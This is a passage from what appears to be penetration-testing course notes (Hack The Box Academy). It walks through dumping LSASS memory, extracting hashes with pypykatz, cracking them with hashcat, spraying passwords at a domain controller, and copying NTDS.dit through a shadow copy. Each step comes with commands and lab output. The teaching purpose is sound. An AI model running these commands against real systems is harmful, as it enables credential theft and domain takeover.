<p>With this command, we are running <code class="language-plaintext highlighter-rouge">rundll32.exe</code> to call an exported function of <code class="language-plaintext highlighter-rouge">comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code class="language-plaintext highlighter-rouge">MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code class="language-plaintext highlighter-rouge">C:\lsass.dmp</code>). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.</p>

<p>If we manage to run this command and generate the <code class="language-plaintext highlighter-rouge">lsass.dmp</code> file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.</p>

<p>Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.</p>

<h5 id="using-pypykatz-to-extract-credentials">Using Pypykatz to Extract Credentials</h5>

<p>Once we have the dump file on our attack host, we can use a powerful tool called <a href="https://github.com/skelsec/pypykatz">pypykatz</a> to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.</p>

<p>Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a “snapshot” of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let’s run Pypykatz against the dump file and find out.</p>

<h6 id="running-pypykatz">Running Pypykatz</h6>

<p>The command initiates the use of <code class="language-plaintext highlighter-rouge">pypykatz</code> to parse the secrets hidden in the LSASS process memory dump. We use <code class="language-plaintext highlighter-rouge">lsa</code> in the command because LSASS is a subsystem of <code class="language-plaintext highlighter-rouge">local security authority</code>, then we specify the data source as a <code class="language-plaintext highlighter-rouge">minidump</code> file, proceeded by the path to the dump file (<code class="language-plaintext highlighter-rouge">/home/peter/Documents/lsass.dmp</code>) stored on our attack host. Pypykatz parses the dump file and outputs the findings:</p>

<p>Attacking LSASS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: <span class="o">========</span> /home/peter/Documents/lsass.dmp <span class="o">=======</span>
<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 1354633 <span class="o">(</span>14ab89<span class="o">)</span>
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>14ab89]<span class="o">==</span>
		username bob
		domainname DESKTOP-33E7O54
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: bob
		Domain: DESKTOP-33E7O54
	<span class="o">==</span> WDIGEST <span class="o">[</span>14ab89]<span class="o">==</span>
		username bob
		domainname DESKTOP-33E7O54
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> DPAPI <span class="o">[</span>14ab89]<span class="o">==</span>
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 1354581 <span class="o">(</span>14ab55<span class="o">)</span>
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>14ab55]<span class="o">==</span>
		username bob
		domainname DESKTOP-33E7O54
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: bob
		Domain: DESKTOP-33E7O54
	<span class="o">==</span> WDIGEST <span class="o">[</span>14ab55]<span class="o">==</span>
		username bob
		domainname DESKTOP-33E7O54
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 1343859 <span class="o">(</span>148173<span class="o">)</span>
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	<span class="o">==</span> WDIGEST <span class="o">[</span>148173]<span class="o">==</span>
		username WIN-6T0C3J2V6HP<span class="err">$</span>
		domainname WORKGROUP
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> WDIGEST <span class="o">[</span>148173]<span class="o">==</span>
		username WIN-6T0C3J2V6HP<span class="err">$</span>
		domainname WORKGROUP
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
</code></pre></div></div>

<p>Lets take a more detailed look at some of the useful information in the output.</p>

<h6 id="msv">MSV</h6>

<p>Attacking LSASS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
</code></pre></div></div>

<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the <code class="language-plaintext highlighter-rouge">SID</code>, <code class="language-plaintext highlighter-rouge">Username</code>, <code class="language-plaintext highlighter-rouge">Domain</code>, and even the <code class="language-plaintext highlighter-rouge">NT</code> &amp; <code class="language-plaintext highlighter-rouge">SHA1</code> password hashes associated with the bob user account’s logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.</p>

<h6 id="wdigest">WDIGEST</h6>

<p>Attacking LSASS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="o">==</span> WDIGEST <span class="o">[</span>14ab89]<span class="o">==</span>
		username bob
		domainname DESKTOP-33E7O54
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">WDIGEST</code> is an older authentication protocol enabled by default in <code class="language-plaintext highlighter-rouge">Windows XP</code> - <code class="language-plaintext highlighter-rouge">Windows 8</code> and <code class="language-plaintext highlighter-rouge">Windows Server 2003</code> - <code class="language-plaintext highlighter-rouge">Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update <a href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">here</a>.</p>

<h4 id="kerberos">Kerberos</h4>

<p>Attacking LSASS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: bob
		Domain: DESKTOP-33E7O54
</code></pre></div></div>

<p><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a> is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS <code class="language-plaintext highlighter-rouge">caches passwords</code>, <code class="language-plaintext highlighter-rouge">ekeys</code>, <code class="language-plaintext highlighter-rouge">tickets</code>, and <code class="language-plaintext highlighter-rouge">pins</code> associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.</p>

<h4 id="dpapi">DPAPI</h4>

<p>Attacking LSASS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="o">==</span> DPAPI <span class="o">[</span>14ab89]<span class="o">==</span>
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
</code></pre></div></div>

<p>The Data Protection Application Programming Interface or <a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">DPAPI</a> is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:</p>

<table>
  <thead>
    <tr>
      <th>Applications</th>
      <th>Use of DPAPI</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Internet Explorer</code></td>
      <td>Password form auto-completion data (username and password for saved sites).</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Google Chrome</code></td>
      <td>Password form auto-completion data (username and password for saved sites).</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Outlook</code></td>
      <td>Passwords for email accounts.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Remote Desktop Connection</code></td>
      <td>Saved credentials for connections to remote machines.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Credential Manager</code></td>
      <td>Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.</td>
    </tr>
  </tbody>
</table>

<p>Mimikatz and Pypykatz can extract the DPAPI <code class="language-plaintext highlighter-rouge">masterkey</code> for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the <a href="https://academy.hackthebox.com/module/details/67">Windows Privilege Escalation</a> module.</p>

<h6 id="cracking-the-nt-hash-with-hashcat">Cracking the NT Hash with Hashcat</h6>

<p>Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won’t need to create a list of hashes as we did in the <code class="language-plaintext highlighter-rouge">Attacking SAM</code> section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.</p>

<p>Attacking LSASS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>hashcat <span class="nt">-m</span> 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
</code></pre></div></div>

<hr />

<h1 id="attacking-active-directory--ntdsdit">Attacking Active Directory &amp; NTDS.dit</h1>

<p><code class="language-plaintext highlighter-rouge">Active Directory</code> (<code class="language-plaintext highlighter-rouge">AD</code>) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack &amp; defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive &amp; significant topic that we have multiple modules covering AD.</p>

<p>In this section, we will focus primarily on how we can extract credentials through the use of a <code class="language-plaintext highlighter-rouge">dictionary attack against AD accounts</code> and <code class="language-plaintext highlighter-rouge">dumping hashes</code> from the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file.</p>

<p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (<code class="language-plaintext highlighter-rouge">3389</code>) or other protocols used for remote access on their <a href="https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html">edge router</a> to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let’s consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png" alt="Diagram showing Windows authentication process with lsass.exe, authentication packages, NTLM, Kerberos, and AD Directory Services." /></p>

<p>Once a Windows system is joined to a domain, it will <code class="language-plaintext highlighter-rouge">no longer default to referencing the SAM database to validate logon requests</code>. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the <code class="language-plaintext highlighter-rouge">hostname</code> of the device proceeded by the <code class="language-plaintext highlighter-rouge">Username</code> (Example: <code class="language-plaintext highlighter-rouge">WS01/nameofuser</code>) or with direct access to the device then typing <code class="language-plaintext highlighter-rouge">./</code> at the logon UI in the <code class="language-plaintext highlighter-rouge">Username</code> field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this <a href="https://attack.mitre.org/techniques/T1003/003/">technique</a>.</p>

<hr />

<h2 id="dictionary-attacks-against-ad-accounts-using-crackmapexec">Dictionary Attacks against AD accounts using CrackMapExec</h2>

<p>Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &amp;/or password using a customized list of potential usernames and passwords. It can be rather <code class="language-plaintext highlighter-rouge">noisy</code> (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)">Group Policy</a>.</p>

<p>When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to <code class="language-plaintext highlighter-rouge">custom tailor</code> our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company’s website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:</p>

<table>
  <thead>
    <tr>
      <th>Username Convention</th>
      <th>Practical Example for Jane Jill Doe</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">firstinitiallastname</code></td>
      <td>jdoe</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">firstinitialmiddleinitiallastname</code></td>
      <td>jjdoe</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">firstnamelastname</code></td>
      <td>janedoe</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">firstname.lastname</code></td>
      <td>jane.doe</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">lastname.firstname</code></td>
      <td>doe.jane</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">nickname</code></td>
      <td>doedoehacksstuff</td>
    </tr>
  </tbody>
</table>

<p>Often, an email address’s structure will give us the employee’s username (structure: username@domain). For example, from the email address <code class="language-plaintext highlighter-rouge">jdoe</code>@<code class="language-plaintext highlighter-rouge">inlanefreight.com</code>, we see that <code class="language-plaintext highlighter-rouge">jdoe</code> is the username.</p>

<p>A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.</p>

<h4 id="creating-a-custom-list-of-usernames">Creating a Custom list of Usernames</h4>

<p>Let’s say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:</p>

<ul>
  <li>Ben Williamson</li>
  <li>Bob Burgerstien</li>
  <li>Jim Stevenson</li>
  <li>Jill Johnson</li>
  <li>Jane Doe</li>
</ul>

<p>We can create a custom list on our attack host using the names above. We can use a command line-based text editor like <code class="language-plaintext highlighter-rouge">Vim</code> or a graphical text editor to create our list. Our list may look something like this:</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">cat </span>usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
</code></pre></div></div>

<p>Of course, this is just an example and doesn’t include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.</p>

<p>We can manually create our list(s) or use an <code class="language-plaintext highlighter-rouge">automated list generator</code> such as the Ruby-based tool <a href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a> to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using <code class="language-plaintext highlighter-rouge">Git</code>, we can run it against a list of real names as shown in the example output below:</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>./username-anarchy <span class="nt">-i</span> /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
</code></pre></div></div>

<p>Using automated tools can save us time when crafting lists. Still, we will benefit from spending as much time as we can attempting to discover the naming convention an organization is using with usernames because this will reduce the need for us to guess the naming convention.</p>

<p>It is ideal to limit the need to guess as much as possible when conducting password attacks.</p>

<h4 id="launching-the-attack-with-netexec">Launching the Attack with NetExec</h4>

<p>Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nxc smb 10.129.201.57 <span class="nt">-u</span> bwilliamson <span class="nt">-p</span> /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC-PAC<span class="o">)</span> <span class="o">(</span>domain:dac.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>-] inlanefrieght.local<span class="se">\b</span>williamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             <span class="o">[</span>+] inlanefrieght.local<span class="se">\b</span>williamson:P@55w0rd! 
</code></pre></div></div>

<p>In this example, CrackMapExec is using SMB to attempt to logon as user (<code class="language-plaintext highlighter-rouge">-u</code>) <code class="language-plaintext highlighter-rouge">bwilliamson</code> using a password (<code class="language-plaintext highlighter-rouge">-p</code>) list containing a list of commonly used passwords (<code class="language-plaintext highlighter-rouge">/usr/share/wordlists/fasttrack.txt</code>). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.</p>

<h4 id="event-logs-from-the-attack">Event Logs from the Attack</h4>

<p><img src="https://academy.hackthebox.com/storage/modules/147/events_dc.png" alt="Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details." /></p>

<p>It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to <code class="language-plaintext highlighter-rouge">Event Viewer</code> and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.</p>

<p>Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.</p>

<hr />

<h5 id="capturing-ntdsdit">Capturing NTDS.dit</h5>

<p><code class="language-plaintext highlighter-rouge">NT Directory Services</code> (<code class="language-plaintext highlighter-rouge">NTDS</code>) is the directory service used with AD to find &amp; organize network resources. Recall that <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file is stored at <code class="language-plaintext highlighter-rouge">%systemroot%/ntds</code> on the domain controllers in a <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model">forest</a>. The <code class="language-plaintext highlighter-rouge">.dit</code> stands for <a href="https://docs.oracle.com/cd/E19901-01/817-7607/dit.html">directory information tree</a>. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module’s <code class="language-plaintext highlighter-rouge">Attacking SAM</code> section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p>

<h5 id="connecting-to-a-dc-with-evil-winrm">Connecting to a DC with Evil-WinRM</h5>

<p>We can connect to a target DC using the credentials we captured.</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.129.201.57  <span class="nt">-u</span> bwilliamson <span class="nt">-p</span> <span class="s1">'P@55w0rd!'</span>
</code></pre></div></div>

<p>Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.</p>

<h6 id="checking-local-group-membership">Checking Local Group Membership</h6>

<p>Once connected, we can check to see what privileges <code class="language-plaintext highlighter-rouge">bwilliamson</code> has. We can start with looking at the local group membership using the command:</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> net localgroup

Aliases <span class="k">for</span> <span class="se">\\</span>DC01

<span class="nt">-------------------------------------------------------------------------------</span>
<span class="k">*</span>Access Control Assistance Operators
<span class="k">*</span>Account Operators
<span class="k">*</span>Administrators
<span class="k">*</span>Allowed RODC Password Replication Group
<span class="k">*</span>Backup Operators
<span class="k">*</span>Cert Publishers
<span class="k">*</span>Certificate Service DCOM Access
<span class="k">*</span>Cryptographic Operators
<span class="k">*</span>Denied RODC Password Replication Group
<span class="k">*</span>Distributed COM Users
<span class="k">*</span>DnsAdmins
<span class="k">*</span>Event Log Readers
<span class="k">*</span>Guests
<span class="k">*</span>Hyper-V Administrators
<span class="k">*</span>IIS_IUSRS
<span class="k">*</span>Incoming Forest Trust Builders
<span class="k">*</span>Network Configuration Operators
<span class="k">*</span>Performance Log Users
<span class="k">*</span>Performance Monitor Users
<span class="k">*</span>Pre-Windows 2000 Compatible Access
<span class="k">*</span>Print Operators
<span class="k">*</span>RAS and IAS Servers
<span class="k">*</span>RDS Endpoint Servers
<span class="k">*</span>RDS Management Servers
<span class="k">*</span>RDS Remote Access Servers
<span class="k">*</span>Remote Desktop Users
<span class="k">*</span>Remote Management Users
<span class="k">*</span>Replicator
<span class="k">*</span>Server Operators
<span class="k">*</span>Storage Replica Administrators
<span class="k">*</span>Terminal Server License Servers
<span class="k">*</span>Users
<span class="k">*</span>Windows Authorization Access Group
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (<code class="language-plaintext highlighter-rouge">Administrators group</code>) or Domain Admin (<code class="language-plaintext highlighter-rouge">Domain Admins group</code>) (or equivalent) rights. We also will want to check what domain privileges we have.</p>

<h4 id="checking-user-account-privileges-including-domain">Checking User Account Privileges including Domain</h4>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
</span></code></pre></div></div>

<p>This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.</p>

<h4 id="creating-shadow-copy-of-c">Creating Shadow Copy of C:</h4>

<p>We can use <code class="language-plaintext highlighter-rouge">vssadmin</code> to create a <a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service">Volume Shadow Copy</a> (<code class="language-plaintext highlighter-rouge">VSS</code>) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp; disaster recovery software to perform operations.</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> vssadmin CREATE SHADOW /For<span class="o">=</span>C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
<span class="o">(</span>C<span class="o">)</span> Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy <span class="k">for</span> <span class="s1">'C:\'</span>
    Shadow Copy ID: <span class="o">{</span>186d5979-2f2b-4afe-8101-9f1111e4cb1a<span class="o">}</span>
    Shadow Copy Volume Name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy2
</code></pre></div></div>

<h4 id="copying-ntdsdit-from-the-vss">Copying NTDS.dit from the VSS</h4>

<p>We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\NTDS&gt;</span><span class="w"> </span>cmd.exe /c copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy2<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit c:<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit
<span class="go">
        1 file(s) copied.
</span></code></pre></div></div>

<p>Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the <code class="language-plaintext highlighter-rouge">Attacking SAM</code> section to review that method if needed.</p>

<h4 id="transferring-ntdsdit-to-attack-host">Transferring NTDS.dit to Attack Host</h4>

